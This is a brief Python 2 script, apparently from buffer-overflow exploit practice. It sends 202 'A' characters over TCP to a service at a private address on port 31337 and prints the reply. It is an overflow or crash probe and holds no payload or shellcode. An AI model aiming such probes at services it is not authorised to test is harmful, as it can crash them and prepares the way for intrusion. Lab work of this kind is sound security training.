import sys, socket, time

host = "192.168.1.8"

port = 31337

pattern = "A"*202

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

client.connect((host, port)) 

client.send(pattern) 

data = client.recv(1024)

print "Received: {0}".format(data)

client.close()